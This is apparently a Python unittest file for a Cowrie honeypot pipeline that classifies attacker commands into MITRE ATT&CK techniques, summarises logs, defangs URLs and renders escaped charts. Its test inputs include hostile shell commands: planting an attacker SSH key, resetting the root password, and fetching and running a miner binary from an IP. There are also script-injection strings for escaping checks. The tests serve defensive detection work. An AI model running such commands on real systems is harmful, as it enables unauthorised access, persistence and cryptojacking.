import datetime as dt
import importlib.util
import json
import os
import tempfile
import unittest
import xml.etree.ElementTree as ET
from pathlib import Path
from unittest import mock

from pipeline import render, stats
from pipeline.attack import classify, technique_url
from pipeline.cowrie import parse_networks, summarize
from pipeline.geo import GeoDB

FIXTURE = Path(__file__).parent / "fixtures" / "cowrie-3.1.json"   # recorded from a real Cowrie 3.1.2
ROOT = Path(__file__).resolve().parent.parent


def event(eventid, session="s1", ip="203.0.113.7", ts="2026-10-12T10:00:00.000000Z", **fields):
    return json.dumps({"eventid": eventid, "session": session, "src_ip": ip, "timestamp": ts,
                       "protocol": "ssh", "sensor": "test", **fields})


class AttackMappingTest(unittest.TestCase):
    def test_recon_and_persistence(self):
        found = classify([
            "uname -a; cat /proc/cpuinfo | grep name | wc -l",
            'cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAA mdrfckr">>.ssh/authorized_keys',
            'echo "root:x"|chpasswd|bash',
        ])
        self.assertTrue({"T1082", "T1098.004", "T1098", "T1070.004", "T1059.004"} <= found)

    def test_download_and_miner(self):
        found = classify(["cd /tmp; wget http://203.0.113.5/x; chmod +x x; ./x -o stratum+tcp://p:3333"])
        self.assertTrue({"T1105", "T1222.002", "T1496"} <= found)

    def test_wrappers_and_paths_are_unwrapped(self):
        self.assertIn("T1105", classify(["sudo /usr/bin/curl -O http://203.0.113.5/a"]))
        self.assertIn("T1057", classify(["HOME=/tmp busybox ps"]))

    def test_harmless_input_maps_to_nothing(self):
        self.assertEqual(classify(["echo hello", "exit", ""]), set())

    def test_technique_url(self):
        self.assertEqual(technique_url("T1098.004"), "https://attack.mitre.org/techniques/T1098/004/")


class SummarizeTest(unittest.TestCase):
    def test_real_cowrie_log(self):
        day = summarize(FIXTURE.read_text().splitlines(), "2026-10-13")
        t = day["totals"]
        self.assertEqual((t["sessions"], t["login_attempts"], t["login_success"]), (7, 7, 5))
        self.assertEqual(day["protocols"], {"ssh": 6, "telnet": 1})
        self.assertEqual(day["unique_ips"], 1)
        self.assertEqual(t["downloads"], 1)
        self.assertEqual(day["downloads"][0]["url"], "http://example.com/index.html")
        self.assertIn(["SSH-2.0-OpenSSH_10.0", 6], day["clients"])
        self.assertEqual(day["techniques"]["T1110.001"], 7)
        self.assertEqual(sum(day["hourly"]), 7)

    def test_per_ip_counters_and_credentials(self):
        lines = [
            event("cowrie.session.connect"),
            event("cowrie.login.failed", username="root", password="root"),
            event("cowrie.login.success", username="root", password="1234"),
            event("cowrie.command.input", input="  uname -a "),
            event("cowrie.session.connect", session="s2", ip="198.51.100.1", ts="2026-10-12T23:59:59Z"),
            "not json",
            json.dumps(["not", "an", "object"]),
        ]
        day = summarize(lines, "2026-10-12")
        self.assertEqual(day["ips"]["203.0.113.7"], [1, 2, 1, 1])
        self.assertEqual(day["credentials"][0][2], 1)
        self.assertIn(["uname -a", 1], day["commands"])
        self.assertEqual(day["hourly"][10], 1)
        self.assertEqual(day["hourly"][23], 1)
        self.assertEqual(day["totals"]["malformed_lines"], 1)
        self.assertEqual(day["totals"]["interactive_sessions"], 1)

    def test_operator_ips_are_dropped(self):
        lines = [event("cowrie.session.connect"),
                 event("cowrie.login.failed", username="root", password="root"),
                 event("cowrie.session.connect", session="s2", ip="198.51.100.9"),
                 event("cowrie.session.connect", session="s3", ip="2001:db8::5")]
        day = summarize(lines, "2026-10-12", parse_networks(" 203.0.113.7, 198.51.100.0/24\n2001:db8::/32 "))
        self.assertEqual((day["totals"]["sessions"], day["unique_ips"], day["ips"]), (0, 0, {}))
        self.assertEqual(day["usernames"], [])
        self.assertEqual(summarize(lines, "2026-10-12", parse_networks(""))["unique_ips"], 3)
        with self.assertRaisesRegex(ValueError, "not an IP") as caught:
            parse_networks("203.0.113.7,secret-host")
        self.assertNotIn("secret-host", str(caught.exception))

    def test_attacker_strings_are_bounded(self):
        day = summarize([event("cowrie.command.input", input="A" * 10_000 + "\x00")], "2026-10-12")
        self.assertEqual(len(day["commands"][0][0]), 500)


class StatsTest(unittest.TestCase):
    def days(self, n, sessions=10):
        start = dt.date(2026, 9, 1)
        out = []
        for i in range(n):
            date = (start + dt.timedelta(days=i)).isoformat()
            lines = [event("cowrie.session.connect", session=f"{date}-{k}", ip=f"203.0.113.{k}",
                           ts=f"{date}T05:00:00Z") for k in range(sessions)]
            out.append(summarize(lines, date))
        return out

    def test_windows_and_previous_period(self):
        result = stats.build(self.days(20), GeoDB(), now=dt.datetime(2026, 9, 21, tzinfo=dt.timezone.utc))
        w7, w30, wall = (result["windows"][k] for k in ("7d", "30d", "all"))
        self.assertEqual((w7["days"], w7["totals"]["sessions"]), (7, 70))
        self.assertEqual(w7["previous"]["sessions"], 70)
        self.assertIsNone(w30["previous"])          # no full 30 days before the window
        self.assertEqual(wall["totals"]["unique_ips"], 10)
        self.assertEqual(sum(map(sum, wall["heatmap"])), 200)
        self.assertEqual(result["sensor"]["first_day"], "2026-09-01")

    def test_gaps_are_zero_filled(self):
        days = self.days(5)
        del days[2]
        daily = stats.build(days, GeoDB())["windows"]["all"]["daily"]
        self.assertEqual([d["sessions"] for d in daily], [10, 10, 0, 10, 10])

    def test_empty(self):
        self.assertEqual(stats.build([], GeoDB())["windows"], {})

    def test_defang(self):
        self.assertEqual(stats.defang("http://203.0.113.5/bins.sh"), "hxxp://203[.]0[.]113[.]5/bins.sh")
        self.assertEqual(stats.defang("https://evil.example/a.b"), "hxxps://evil[.]example/a.b")
        self.assertEqual(stats.defang("x.sh"), "x[.]sh")


class RenderTest(unittest.TestCase):
    NASTY = ['<script>alert(1)</script>', 'a|b`c``d', '\x1b[31mred\x07', '', '&amp; "quoted"', '\ud800']

    def test_svg_is_well_formed_with_hostile_labels(self):
        doc = render.bar_chart([(s, i + 1) for i, s in enumerate(self.NASTY)], "t", mono=True)
        root = ET.fromstring(doc)
        texts = "".join(root.itertext())
        self.assertIn("<script>", texts)               # shown as text...
        self.assertEqual(root.findall(".//{http://www.w3.org/2000/svg}script"), [])  # ...never as markup
        self.assertIn("\\x1b", texts)

    def test_area_chart_is_well_formed(self):
        ET.fromstring(render.area_chart([("2026-10-01", 5), ("2026-10-02", 1500)], "t"))
        ET.fromstring(render.area_chart([], "t"))

    def test_markdown_code_spans(self):
        self.assertEqual(render.md_code("a|b"), "`a\\|b`")
        self.assertEqual(render.md_code("x`y"), "``x`y``")
        self.assertEqual(render.md_code("`edge"), "`` `edge ``")
        self.assertEqual(render.md_code(""), "*(empty)*")
        self.assertNotIn("\n", render.md_code("line1\nline2"))

    def test_compact_and_ticks(self):
        self.assertEqual([render.compact(n) for n in (999, 1000, 1284, 12_900_000)], ["999", "1K", "1.3K", "12.9M"])
        self.assertEqual(render.nice_ticks(1234), [0, 500, 1000, 1500])

    def test_readme_block_replaced_between_markers(self):
        with tempfile.TemporaryDirectory() as tmp:
            readme = Path(tmp) / "README.md"
            readme.write_text(f"intro\n{render.START}\nold\n{render.END}\noutro\n")
            self.assertTrue(render.update_readme(readme, "new"))
            self.assertEqual(readme.read_text(), f"intro\n{render.START}\nnew\n{render.END}\noutro\n")


class ShipperTest(unittest.TestCase):
    def load_shipper(self, env):
        with mock.patch.dict(os.environ, env):
            spec = importlib.util.spec_from_file_location("shipper", ROOT / "sensor" / "shipper.py")
            module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(module)
        return module

    def test_dry_run_ships_each_day_once(self):
        with tempfile.TemporaryDirectory() as tmp:
            tmp = Path(tmp)
            logs = tmp / "var" / "log" / "cowrie"
            logs.mkdir(parents=True)
            (logs / "cowrie.json.2026-10-11").write_text(FIXTURE.read_text())
            (logs / "cowrie.json").write_text(FIXTURE.read_text())
            shipper = self.load_shipper({"COWRIE_VAR": str(tmp / "var"), "STATE_DIRECTORY": str(tmp / "state"),
                                         "SHIPPER_DRY_RUN_DIR": str(tmp / "blobs")})
            with mock.patch("builtins.print"):
                self.assertEqual(shipper.main(), 0)
            blob = tmp / "blobs" / "cowrie" / "2026-10-11.json.gz"
            self.assertTrue(blob.exists())
            import gzip
            self.assertEqual(gzip.decompress(blob.read_bytes()).decode(), FIXTURE.read_text())
            with mock.patch("builtins.print") as printed:
                shipper.main()
            self.assertFalse(any("uploaded" in str(c) for c in printed.call_args_list))


if __name__ == "__main__":
    unittest.main()
